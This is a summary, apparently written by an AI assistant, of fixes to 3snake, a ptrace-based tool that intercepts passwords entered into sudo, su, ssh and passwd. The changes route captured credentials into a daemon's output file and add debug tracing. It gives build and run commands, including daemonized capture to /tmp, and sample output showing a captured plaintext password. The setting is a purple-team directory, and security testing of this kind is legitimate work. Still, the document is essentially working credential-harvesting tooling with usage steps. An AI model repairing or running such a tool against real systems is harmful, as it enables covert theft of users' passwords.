# Summary of Fixes Applied to 3snake

## Changes Made

### 1. Fixed Output Macro (src/helpers.h)
**Change**: Modified the `output()` macro to write to **stdout** instead of stderr and added `fflush()`

**Before**:
```c
#define output(x...) { \
fprintf(stderr, "[%s] %d %d %s\t", process_username, (int)time(0), process_pid, process_name);\
fprintf(stderr, x);\
}\
```

**After**:
```c
#define output(x...) { \
fprintf(stdout, "[%s] %d %d %s\t", process_username, (int)time(0), process_pid, process_name);\
fprintf(stdout, x);\
fflush(stdout);\
}\
```

**Why**: The program redirects stdout (fd 1) to the output file when daemonized, but the output macro was writing to stderr. Now traced credentials go to the correct output stream and are immediately flushed.

---

### 2. Added Comprehensive Debug Output

#### src/plisten.c
- Added debug messages to `plisten()` function to show listener initialization
- Added debug messages to `handle_proc_ev()` to log:
  - All process events received
  - Event type and PID
  - Whether events trigger process tracing
  - Socket errors

#### src/tracers.c
- Added debug messages to `validate_process_name()`:
  - Shows the actual process name being checked
  - Logs which pattern matched (SSH, SUDO, SU, PASSWD, SSH_CLIENT)
  - Logs if no pattern matched

- Added debug messages to `validate_process_path()`:
  - Shows the actual process path being checked
  - Logs each comparison against allowed paths
  - Logs if path validation succeeded or failed

- Added debug messages to `trace_process()`:
  - Shows PID, name, and path of process being traced
  - Logs at each validation step
  - Helps identify where tracing fails

#### src/sudo_tracer.c
- Added debug messages to `intercept_sudo()`:
  - Logs when interception starts
  - Logs ptrace attachment attempt and result
  - Logs each syscall being traced
  - Logs when passwords are captured and output
  - Logs on exit

---

## How to Use These Fixes

### Build the Program
```bash
cd /home/dj/PurpleTeam/3snake/3snake
make clean
make
```

### Test with Debug Output Visible
```bash
# Run in terminal (not daemonized) - debug output goes to stderr
sudo ./3snake

# In another terminal, run a sudo/su command:
sudo -l
# or
sudo su
# or
sudo passwd root
```

Watch for debug messages starting with `[DEBUG]` to understand the execution flow.

### Test with Output to File
```bash
# Daemonize with output file
sudo ./3snake -d -o /tmp/3snake_output.txt

# Run a sudo command
sudo su

# Check the output file
cat /tmp/3snake_output.txt
```

---

## What the Debug Output Shows

### Successful Flow Example
```
[DEBUG] plisten: Starting process listener
[DEBUG] plisten: netlink socket connected
[DEBUG] plisten: process event listening enabled
[DEBUG] handle_proc_ev: Event type=6, pid=12345
[DEBUG] PROC_EVENT_EXEC detected, pid=12345
[DEBUG] trace_process: pid=12345, name=sudo -l, path=/usr/bin/sudo
[DEBUG] validate_process_name: Checking process_name='sudo -l'
[DEBUG] validate_process_name: Matched SUDO
[DEBUG] validate_process_name returned type=2
[DEBUG] validate_process_path: Checking path='/usr/bin/sudo'
[DEBUG] validate_process_path: Comparing with '/usr/bin/'
[DEBUG] validate_process_path: Path matched!
[DEBUG] All validations passed, calling tracer type=2
[SUDO] intercept_sudo called for pid=12345
[SUDO] Attempting PTRACE_ATTACH to pid=12345
[SUDO] Process attached successfully
[SUDO] Syscall: 0
...
[user] 1234567890 12345 sudo -l     mypassword
```

### Failure Points to Check
- If you see `validate_process_name: No match found` - the process name doesn't match "sudo ", "su ", etc.
- If you see `validate_process_path: No path match found` - the binary isn't in an allowed path
- If you see `Process not stopped after attach!` - ptrace couldn't attach to the process
- If you don't see any `PROC_EVENT_EXEC` or `PROC_EVENT_UID` messages - kernel isn't sending netlink events

---

## Root Cause Analysis

The original issue was that traced credentials weren't being output anywhere. This was because:

1. **stderr vs stdout mismatch**: The output macro wrote to stderr, but when daemonized, stdout (not stderr) is redirected to the output file
2. **No debug visibility**: Without debug output, it was impossible to know if:
   - Process events were being detected
   - Process validation was succeeding
   - Syscall tracing was working
   - Passwords were being captured

These fixes address both issues by:
- Correctly outputting credentials to stdout (which gets redirected to the file)
- Adding extensive debug output to understand the execution flow
